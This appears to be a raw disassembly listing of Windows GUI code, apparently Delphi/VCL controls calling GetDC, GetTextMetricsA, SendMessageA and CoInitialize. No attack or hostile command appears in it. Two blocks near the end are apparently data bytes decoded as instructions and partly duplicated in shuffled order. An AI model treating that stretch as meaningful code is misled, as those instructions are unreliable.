lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bb18
call sub_403a64
sub_43dd74
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_456358
test al al
je r-xdata
mov [ ebx + 0x240 ] esi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx esi
call sub_42aa18
sub_43ddb0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
mov ebx eax
xor esi esi
fld [ ebp + 0x10 ]
call sub_402ac8
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
fld [ ebp + 0x8 ]
call sub_402ac8
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fld [ ebx + 0x210 ]
call sub_402ac8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
fld [ ebx + 0x218 ]
call sub_402ac8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
je r-xdata
cmp [ ebp - 0x18 ] 0x0
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
je r-xdata
cmp [ ebp - 0x20 ] 0x0
jge r-xdata
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax ebx
call sub_456358
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_43d91c
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
lea ecx [ ebp - 0x40 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xe0 ]
test al al
jne r-xdata
jle r-xdata
cmp eax [ ebp - 0x20 ]
jbe r-xdata
jge r-xdata
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x1c ]
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43d91c
jmp r-xdata
or esi 0x1
fild [ ebp - 0x18 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x40 ]
call sub_409bf0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_43da5c
jmp r-xdata
jle r-xdata
cmp eax [ ebp - 0x20 ]
jbe r-xdata
or esi 0x2
fild [ ebp - 0x20 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x30 ]
call sub_409bf0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43da5c
jmp r-xdata
sub_43df00
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov ebx eax
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x20 ]
call sub_409bf0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_409bf0
mov eax ebx
call sub_456358
test al al
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_43d9d4
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x214 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x218 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x21c ] eax
mov eax ebx
call sub_456054
lea edx [ ebp - 0x20 ]
call sub_42a9f0
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
sub_43dfb0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
mov [ esi + 0x20c ] eax
mov [ esi + 0x251 ] 0x0
xor edx edx
mov eax esi
call sub_43d5f0
push [ esi + 0x214 ]
push [ esi + 0x210 ]
lea eax [ esi + 0x258 ]
call sub_409bf0
mov [ esi + 0x269 ] 0x0
mov [ esi + 0x252 ] 0x1
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xff000005
mov eax esi
call sub_44f9f4
xor edx edx
mov eax esi
call sub_44fa18
mov dl 0x1
mov eax esi
call sub_456288
mov edx 0xba
mov eax esi
call sub_44f010
mov eax esi
call sub_43e080
mov [ esi + 0x250 ] 0x0
mov [ esi + 0x253 ] 0x0
mov [ esi + 0x254 ] 0x0
mov [ esi + 0x256 ] 0x0
mov [ esi + 0x268 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_43e080
push ebp
mov ebp esp
add esp 0xffffff88
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43e0f6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetTextMetricsA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_424408
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
mov ebx eax
lea eax [ ebp - 0x78 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetTextMetricsA
push ebx
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e0fd
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_43e14c
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
mov edx edi
mov eax ebp
call sub_452ee0
mov ecx r-xdata
mov edx edi
mov eax ebp
call sub_452e0c
cmp [ ebp + 0x254 ] 0x1
jne r-xdata
cmp [ ebp + 0x256 ] 0x1
jne r-xdata
or [ edi + 0x4 ] 0x1
xor eax eax
mov al [ ebp + 0x253 ]
mov eax [ eax * 4 + rw-data ]
or [ edi + 0x4 ] eax
or [ edi + 0x4 ] 0x9
jmp r-xdata
cmp bl 0x1
jne r-xdata
test bl bl
jne r-xdata
mov bl [ ebp + 0x250 ]
mov eax ebp
mov si 0xffc8
call sub_4034ac
test al al
je r-xdata
cmp [ ebp + 0x268 ] 0x0
je r-xdata
or [ edi + 0x4 ] 0x20
xor ebx ebx
mov bl 0x1
jmp r-xdata
cmp [ ebp + 0x269 ] 0x0
je r-xdata
or [ edi + 0x4 ] 0x10
and [ edi + 0x24 ] 0xfffffffc
pop ebp
pop edi
pop esi
pop ebx
retn
or [ edi + 0x4 ] 0x2
sub_43e218
push ebx
mov ebx eax
mov eax ebx
call sub_43d7d4
mov dl [ ebx + 0x252 ]
mov eax ebx
call sub_43e634
mov eax [ ebx + 0x290 ]
call sub_40436c
test eax eax
jle r-xdata
pop ebx
retn
mov eax [ ebx + 0x290 ]
call sub_40456c
push eax
push 0x0
push 0x1005
mov eax ebx
call sub_456054
push eax
call SendMessageA
sub_43e280
push ebx
mov ebx eax
mov eax ebx
call sub_4555b0
mov eax ebx
call sub_43e080
push 0xffffffff
push 0x0
mov eax ebx
call sub_456054
push eax
call InvalidateRect
pop ebx
retn
sub_43e2a4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
mov esi eax
xor eax eax
push ebp
push sub_43e4b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edx + 0x8 ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov eax [ eax + 0x8 ]
sub eax 0xfffffd09
je r-xdata
mov ebx [ edx + 0x8 ]
cmp [ esi + 0x255 ] 0x0
je r-xdata
dec eax
je r-xdata
cmp [ esi + 0x269 ] 0x0
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ edx + 0x8 ]
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0xc ]
call sub_4042a4
mov eax [ ebp - 0x10 ]
call sub_40b214
fstp [ ebp - 0x8 ]
fwait
cmp [ esi + 0x272 ] 0x0
je r-xdata
sub eax 0x4
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
lea eax [ ebx + 0x10 ]
call sub_43dfa0
test al al
je r-xdata
push esi
lea edi [ esi + 0x258 ]
lea esi [ ebx + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea eax [ esi + 0x258 ]
call sub_409c30
fstp [ esi + 0x210 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x14 ]
mov edx [ ebx + 0xc ]
call sub_4042a4
mov ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ esi + 0x274 ]
call [ esi + 0x270 ]
mov al [ ebp - 0x9 ]
xor al 0x1
and eax 0x7f
mov [ ebx + 0x20 ] eax
jmp r-xdata
mov eax esi
call sub_43d8ec
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ esi + 0x258 ]
call sub_409bf0
mov [ esi + 0x255 ] 0x1
cmp [ esi + 0x28a ] 0x0
je r-xdata
dec eax
jne r-xdata
mov eax esi
mov si 0xffb3
call sub_4034ac
jmp r-xdata
push esi
lea edi [ esi + 0x258 ]
lea esi [ ebx + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea eax [ ebx + 0x10 ]
call sub_409c30
fstp [ ebp - 0x8 ]
fwait
cmp [ esi + 0x256 ] 0x0
jne r-xdata
mov [ esi + 0x252 ] 0x0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e4bd
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4040d0
retn
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_409bf0
jmp r-xdata
mov edx esi
mov eax [ esi + 0x28c ]
call [ esi + 0x288 ]
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ esi + 0x255 ] 0x0
lea eax [ esi + 0x258 ]
call sub_409c30
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_43d91c
cmp [ esi + 0x27a ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax esi
call sub_43e6f8
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax esi
call sub_43d91c
jmp r-xdata
mov edx esi
mov eax [ esi + 0x27c ]
call [ esi + 0x278 ]
jmp r-xdata
mov [ esi + 0x252 ] 0x1
cmp [ esi + 0x269 ] 0x0
je r-xdata
sub_43e4f4
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_456358
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_456054
mov ecx ebp
mov edx edi
call sub_42aa60
cmp eax 0xffffffff
setne bl
sub_43e528
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
push edi
mov esi edx
lea edi [ ebp - 0x16 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_456358
test al al
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x251 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x251 ] 0x1
xor eax eax
push ebp
push sub_43e5c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_456054
lea ecx [ ebp - 0x16 ]
xor edx edx
call sub_42aa28
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x251 ] 0x0
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x252 ] dl
sub_43e5d4
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_456358
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
mov eax esi
call sub_456054
mov ecx ebp
mov edx edi
call sub_42aa44
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_43e634
push ebx
add esp 0xfffffff0
mov ebx eax
mov [ ebx + 0x252 ] dl
cmp [ ebx + 0x269 ] 0x0
je r-xdata
add esp 0x10
pop ebx
retn
test dl dl
je r-xdata
mov eax ebx
call sub_456054
mov ecx esp
mov edx 0x1
call sub_42aa28
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
mov eax ebx
call sub_43d9d4
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43e6f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
fld [ ebx + 0x210 ]
call sub_402a98
fabs
fstp [ ebp - 0xc ]
fwait
fld [ ebp + 0x8 ]
call sub_402a98
fabs
fld [ ebp - 0xc ]
fcompp
fnstsw ax
sahf
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
lea eax [ ebp + 0x8 ]
call sub_409d6c
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43d9d4
cmp [ ebx + 0x269 ] 0x0
jne r-xdata
mov [ ebx + 0x252 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
sub_43e790
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x290 ]
mov edx esi
call sub_4044b8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x290 ]
mov edx esi
call sub_404100
mov eax [ ebx + 0x290 ]
call sub_40456c
push eax
push 0x0
push 0x1005
mov eax ebx
call sub_456054
push eax
call SendMessageA
sub_43e7d8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4301f4
mov edi esi
mov eax [ edi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov eax [ edi + 0x24 ]
mov [ ebx + 0x24 ] eax
mov eax [ edi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
lea eax [ ebx + 0x10 ]
mov edx [ edi + 0x10 ]
call sub_404100
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43e824
push ebx
mov ebx eax
mov eax ebx
call sub_4302f4
mov eax ebx
call sub_419390
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebx + 0x4 ]
mov al [ edx + 0x1d ]
cmp al 0x2
je r-xdata
mov eax edx
call sub_4304ec
cmp al 0x3
jne r-xdata
pop ebx
retn
sub_43e858
push ebx
mov ebx eax
mov eax ebx
call sub_430310
mov eax ebx
call sub_419390
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebx + 0x4 ]
mov al [ edx + 0x1d ]
cmp al 0x1
je r-xdata
mov eax edx
call sub_4304ec
cmp al 0x3
jne r-xdata
pop ebx
retn
sub_43e8ac
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp eax 0xffffffff
je r-xdata
mov [ ebx + 0x1c ] edx
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax ebx
call sub_43031c
mov eax ebx
call sub_419390
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43e8dc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4194b8
mov edx esi
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop esi
pop ebx
retn
sub_43e93c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax esi
call sub_43e930
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx [ ebp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp + 0xc ]
mov [ ebx + 0x24 ] eax
mov edx [ ebp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax ebx
call sub_419390
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_43e9b8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_419920
mov ebp eax
mov esi ebx
mov eax edi
call sub_419720
mov ebx eax
dec ebx
sub ebx esi
jl r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc esi
dec ebx
jne r-xdata
sub_43e9f0
push ebx
push esi
mov ebx edx
mov esi eax
sub cl 0x1
jb r-xdata
mov esi ebx
mov [ esi + 0x18 ] 0xffffffff
mov [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x24 ] 0xffffffff
mov [ esi + 0x20 ] 0xffffffff
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x10 ]
call sub_4040ac
pop esi
pop ebx
retn
sub cl 0x2
jb r-xdata
mov eax esi
call sub_419a30
test [ eax + 0x1c ] 0x8
jne r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
call sub_419390
push eax
push 0x144
mov eax esi
call sub_419a30
call sub_456054
push eax
call SendMessageA
sub_43ea64
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_402cc4
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0xc ] eax
mov eax esp
push eax
push 0x0
push 0x404
mov eax esi
call sub_419a30
call sub_456054
push eax
call SendMessageA
test eax eax
sete al
neg al
sbb ebp ebp
mov edx edi
mov eax esi
call sub_43e9a4
mov ebx eax
mov [ esp ] 0x37
mov eax [ ebx + 0x10 ]
call sub_40456c
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_419390
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_40436c
mov [ esp + 0xc ] eax
mov eax [ ebx + 0x18 ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x1c ]
mov [ esp + 0x14 ] eax
mov eax [ ebx + 0x20 ]
mov [ esp + 0x18 ] eax
mov eax [ ebx + 0x24 ]
mov [ esp + 0x1c ] eax
mov eax [ ebx + 0x14 ]
mov [ esp + 0x20 ] eax
test ebp ebp
je r-xdata
mov eax esp
push eax
push edi
push 0x405
mov eax esi
call sub_419a30
call sub_456054
push eax
call SendMessageA
mov eax esp
push eax
push edi
push 0x401
mov eax esi
call sub_419a30
call sub_456054
push eax
call SendMessageA
jmp r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43eb9f
add [ ebx - 0x15 ] dl
inc ebx
add [ ebp - 0x15 ] bl
inc ebx
add [ edi - 0x15 ] ah
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
nop
inc eax
add al ch
xor al 0x40
add al ah
pop ecx
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x15004032 ] ah
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ ecx + 0x27883 ] cl
js r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x1
push r-xdata
call GetModuleHandleA
mov esi eax
test esi esi
je r-xdata
add [ ebx - 0x5efe4d35 ] cl
cld
pop esp
inc ebx
add al ch
sub ecx [ ebx ]
add [ eax ] al
cmp [ eax + 0x2 ] 0x0
outsb
jne r-xdata
push 0x0
call CoInitialize
push 0x2
push 0x0
call [ rw-data ]
jmp r-xdata
push r-xdata
push esi
call GetProcAddress
mov [ rw-data ] eax
mov [ ebx + 0x28c ] eax
mov dl 0x1
mov eax [ r-xdata ]
jb r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
jne r-xdata
add al [ eax ]
add [ ecx + 0x408b1058 ] cl
adc al 0x89
or [ edx + eax + 0x1b20000 ] 0xffffffa1
cmp al 0xc7
inc ebp
add al ch
fld [ ebp - 0x4 ]
dec [ ebx + 0x7cb389f0 ]
add al [ eax ]
add [ ecx + 0x46c70c5e ] cl
or [ edi + ebp * 8 ] ch
inc ebx
add dh al
or [ ecx + 0x2 ] 0xffffffa0
cmp ch ch
inc ebx
add [ eax + 0x26c83 ] cl
add [ eax + 0x48eafc3d ] al
add [ eax ] al
je r-xdata
call sub_403280
mov esi eax
mov [ ebx + 0x27c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43ef2c
mov [ ebx + 0x289 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x26c ] al
cmp [ rw-data ] 0x0
add [ ecx + r-xdata ] esp
jb r-xdata
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ esi - 0x70 ] al
rcl [ ebp - 0x75 ] 0xec
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10c ]
mov eax [ ebx + 0x23c ]
mov [ eax + 0x10 ] ebx
mov eax [ eax + 0x14 ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax 0x200
call sub_43612c
mov ecx esi
xor edx edx
mov eax ebx
call sub_446714
push ebx
push sub_43f0d0
call sub_466600
mov [ ebx + 0x278 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43f7a8
add esp 0xfffffff0
call sub_4035fc
sub_43ebe2
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb ah ch
inc ebx
add [ eax ] bl
add [ eax ] al
add [ ecx + edx + 0x34e00040 ] ah
inc eax
add ah al
pop ecx
inc eax
add al dl
pop ecx
inc eax
add ah dh
xor al 0x40
add [ ecx + 0x27883 ] cl
js r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x1
push r-xdata
call GetModuleHandleA
mov esi eax
test esi esi
je r-xdata
add [ ebx - 0x5efe4d35 ] cl
cld
pop esp
inc ebx
add al ch
sub ecx [ ebx ]
add [ eax ] al
cmp [ eax + 0x2 ] 0x0
outsb
jne r-xdata
push 0x0
call CoInitialize
push 0x2
push 0x0
call [ rw-data ]
jmp r-xdata
push r-xdata
push esi
call GetProcAddress
mov [ rw-data ] eax
mov [ ebx + 0x28c ] eax
mov dl 0x1
mov eax [ r-xdata ]
jb r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
jne r-xdata
add al [ eax ]
add [ ecx + 0x408b1058 ] cl
adc al 0x89
or [ edx + eax + 0x1b20000 ] 0xffffffa1
cmp al 0xc7
inc ebp
add al ch
fld [ ebp - 0x4 ]
dec [ ebx + 0x7cb389f0 ]
add al [ eax ]
add [ ecx + 0x46c70c5e ] cl
or [ edi + ebp * 8 ] ch
inc ebx
add dh al
or [ ecx + 0x2 ] 0xffffffa0
cmp ch ch
inc ebx
add [ eax + 0x26c83 ] cl
add [ eax + 0x48eafc3d ] al
add [ eax ] al
je r-xdata
call sub_403280
mov esi eax
mov [ ebx + 0x27c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43ef2c
mov [ ebx + 0x289 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x26c ] al
cmp [ rw-data ] 0x0
add [ ecx + r-xdata ] esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ esi - 0x70 ] al
jmp r-xdata
rcl [ ebp - 0x75 ] 0xec
push ecx
push ebx
push esi
test dl dl
je r-xdata
add al ch
xor al 0x40
add al ah
pop ecx
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x15004032 ] ah
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc eax
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10c ]
mov eax [ ebx + 0x23c ]
mov [ eax + 0x10 ] ebx
mov eax [ eax + 0x14 ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax 0x200
call sub_43612c
mov ecx esi
xor edx edx
mov eax ebx
call sub_446714
push ebx
push sub_43f0d0
call sub_466600
mov [ ebx + 0x278 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43f7a8
add esp 0xfffffff0
call sub_4035fc
sub_43ed57
add [ ebx + 0x56 ] dl
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_4032b0
lea eax [ esi + 0x27c ]
call sub_40d564
mov eax esi
call sub_456358
test al al
je r-xdata
mov eax [ esi + 0x278 ]
call sub_466614
lea eax [ esi + 0x284 ]
call sub_40d564
lea eax [ esi + 0x268 ]
call sub_405944
call CoUninitialize
mov edx ebx
and dl 0xfc
mov eax esi
call sub_446808
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_43edd0
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov eax [ eax + 0x8 ]
sub eax 0xfffffcdb
je r-xdata
cmp [ esi + 0x29a ] 0x0
je r-xdata
dec eax
jne r-xdata
pop esi
retn
mov edx esi
mov eax [ esi + 0x29c ]
call [ esi + 0x298 ]
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x292 ] 0x0
je r-xdata
mov edx esi
mov eax [ esi + 0x294 ]
call [ esi + 0x290 ]
pop esi
retn
sub_43ee20
push ebx
push esi
mov ebx edx
mov esi eax
mov eax 0x200
call sub_436100
mov edx ebx
mov eax esi
call sub_452ee0
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_452e0c
mov eax [ ebx + 0x4 ]
or eax 0x10000
or eax 0x200000
or eax 0x2000000
or eax 0x4
or eax 0x40
xor edx edx
mov dl [ esi + 0x289 ]
or eax [ edx * 4 + rw-data ]
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfffffdff
mov eax [ ebx + 0x24 ]
or eax 0x8
and eax 0xfffffffc
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
sub_43ee98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x280 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x280 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x27c ]
call sub_45d560
mov eax ebx
call sub_456358
test al al
je r-xdata
mov edx [ ebx + 0x27c ]
call sub_45d5a4
mov edx ebx
mov eax [ ebx + 0x280 ]
call sub_421440
mov eax ebx
call sub_456358
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0x402
mov eax ebx
call sub_450a20
mov eax ebx
